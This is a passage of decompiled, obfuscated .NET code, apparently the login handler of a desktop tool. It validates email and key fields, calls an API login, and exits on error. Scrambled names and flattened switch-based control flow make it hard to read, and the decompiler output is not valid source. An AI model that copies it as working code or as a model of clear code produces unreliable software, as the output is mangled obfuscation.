              }
              this.Invoke((Delegate) method1);
              num1 = 1127753403;
              continue;
            case 4:
              object method2;
              if (Notif_Sound.\u0024I229\u002D3 != null)
              {
                method2 = (object) Notif_Sound.\u0024I229\u002D3;
              }
              else
              {
                // ISSUE: method pointer
                Notif_Sound.\u0024I229\u002D3 = (VB\u0024AnonymousDelegate_0) (method2 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__229\u002D3)));
              }
              this.Invoke((Delegate) method2);
              num1 = 1979621700;
              continue;
            case 5:
              goto label_39;
            case 6:
              int num3 = !flag1 ? -2128865003 : (num3 = -1811439297);
              num1 = num3 ^ (int) num2 * 1712884049;
              continue;
            case 7:
              goto label_1;
            case 8:
              int num4 = !flag2 ? -1446825473 : (num4 = -1882455789);
              num1 = num4 ^ (int) num2 * 1067976667;
              continue;
            case 9:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__5)));
              num1 = (int) num2 * 35283675 ^ -806806569;
              continue;
            case 10:
              flag1 = !Regex.IsMatch(this.usremailtext.Text, EXGuarder.\u0031312100C);
              num1 = 1295138046;
              continue;
            case 11:
              ((reso) TargetObject).\u0024VB\u0024Local_re = Codes.Apilogin(this.usremailtext.Text, this.usrkeytext.Text);
              int num5 = Operators.CompareString(((reso) TargetObject).\u0024VB\u0024Local_re, EXGuarder.\u0033B307205, false) == 0 ? -1296385029 : (num5 = -1205306181);
              num1 = num5 ^ (int) num2 * -643535887;
              continue;
            case 13:
              int num6;
              num1 = num6 = !string.IsNullOrEmpty(this.usremailtext.Text) ? -1810380911 : (num6 = -1974765845);
              continue;
            case 14:
              object method3;
              if (Notif_Sound.\u0024I229\u002D1 != null)
              {
                method3 = (object) Notif_Sound.\u0024I229\u002D1;
              }
              else
              {
                // ISSUE: method pointer
                Notif_Sound.\u0024I229\u002D1 = (VB\u0024AnonymousDelegate_0) (method3 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__229\u002D1)));
              }
              this.Invoke((Delegate) method3);
              num1 = 1918840808;
              continue;
            case 15:
              int num7 = Operators.CompareString(this.loginbtn.Text, EXGuarder.\u00369335F69, false) != 0 ? 2025477149 : (num7 = -1172012572);
              num1 = num7 ^ (int) num2 * -1285399564;
              continue;
            case 16:
              goto label_33;
            case 17:
              goto label_15;
            case 18:
              num1 = 1804242311;
              continue;
            case 19:
              object method4;
              if (Notif_Sound.\u0024I229\u002D2 != null)
              {
                method4 = (object) Notif_Sound.\u0024I229\u002D2;
              }
              else
              {
                // ISSUE: method pointer
                Notif_Sound.\u0024I229\u002D2 = (VB\u0024AnonymousDelegate_0) (method4 = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__229\u002D2)));
              }
              this.Invoke((Delegate) method4);
              num1 = -1211687830;
              continue;
            case 20:
              num1 = -1105426866;
              continue;
            case 21:
              goto label_7;
            case 22:
              flag2 = string.IsNullOrEmpty(this.usrkeytext.Text) | string.IsNullOrWhiteSpace(this.usrkeytext.Text);
              num1 = (int) num2 * 656007623 ^ -410345620;
              continue;
            case 23:
              int num8;
              num1 = num8 = Regex.IsMatch(this.usrkeytext.Text, EXGuarder.\u0031312100C) ? -1126468858 : (num8 = 2133859081);
              continue;
            case 24:
              goto label_16;
            default:
              goto label_48;
          }
        }
label_43:
        return;
label_39:
        return;
label_33:
        return;
label_15:
        return;
label_7:
        return;
label_16:
        object method;
        if (MultiSounds.\u0024I229\u002D4 != null)
        {
          method = (object) MultiSounds.\u0024I229\u002D4;
        }
        else
        {
          // ISSUE: method pointer
          MultiSounds.\u0024I229\u002D4 = (VB\u0024AnonymousDelegate_0) (method = (object) new EXGuarder((object) SpySettings.\u0024I, __methodptr(_Lambda\u0024__229\u002D4)));
        }
        this.Invoke((Delegate) method);
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        Ports._Closure\u0024__229\u002D1 TargetObject = (Ports._Closure\u0024__229\u002D1) new Ports._Closure\u0024__229\u002D0();
        Exception exception = ex;
label_41:
        int num9 = 1666353535;
        while (true)
        {
          uint num10;
          switch ((num10 = (uint) ((num9 ^ 1927074795 * 2045124796 * -7631975) - (18053834 - --(-406087461 * -808745950)) - -1204422693 * ((-355238271 ^ -1609503635) * -1480145559))) % 5U)
          {
            case 1:
              num9 = (int) num10 * 12965270 ^ 378910968;
              continue;
            case 2:
              ((reso) TargetObject).\u0024VB\u0024Local_ex = exception;
              num9 = (int) num10 * -915870818 ^ 580545771;
              continue;
            case 3:
              // ISSUE: method pointer
              this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__6)));
              Environment.Exit(0);
              num9 = (int) num10 * 1572944791 ^ 1050307703;
              continue;
            case 4:
              goto label_41;
            default:
              goto label_47;
          }
        }
label_47:
        ProjectData.ClearProjectError();
      }
label_48:
      try
      {
        // ISSUE: method pointer
        this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__229\u002D7)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_51:
        int num11 = 2121426161;
        while (true)
        {
          uint num12;
          switch ((num12 = (uint) ((num11 ^ 1927074795 * 2045124796 * -7631975) - (18053834 - --(-406087461 * -808745950)) - -1204422693 * ((-355238271 ^ -1609503635) * -1480145559))) % 4U)
          {
            case 1:
              num11 = (int) num12 * 313821284 ^ 1972359574;
              continue;
            case 2:
              ProjectData.ClearProjectError();
              num11 = (int) num12 * -1066442384 ^ 621607348;
              continue;
            case 3:
              goto label_51;
            default:
              goto label_55;
          }
        }
      }
label_55:;
    }

    private void PictureBox1_Click(object sender, EventArgs e)
    {
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern Ports(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] objs,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void addLogback(object[] objs);

    public delegate void opebbtndele(object[] objs);
  }
}
